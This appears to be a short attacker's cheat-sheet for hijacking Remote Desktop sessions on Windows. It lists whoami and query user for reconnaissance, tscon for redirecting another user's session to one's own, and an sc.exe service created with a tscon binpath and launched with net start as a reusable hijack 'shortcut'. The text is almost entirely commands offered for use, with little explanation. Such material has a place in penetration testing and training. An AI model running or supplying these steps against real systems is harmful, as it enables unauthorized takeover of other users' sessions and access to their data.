RDP SESSION HIJACKING (WINDOWS)
(pretend we are logged in as another user in the same network/ip)
PS:
whoami
query user

(remember we need to have SYSTEM privileges and use the Microsoft tscon.exe)

tscon <target_session_id> /dest:<our_session_name>
(example:) tscon 4 /dest:rdp-tcp#13

CREATING A SESSIONHIJACK 'SHORTCUT'
whoami
query user
(now we make a binpath and name it 'sessionhijack')
sc.exe create sessionhijack binpath= "cmd.exe /k tscon 4 /dest:rdp-tcp#13"

Then you can hijack easily using:
net start sessionhijack
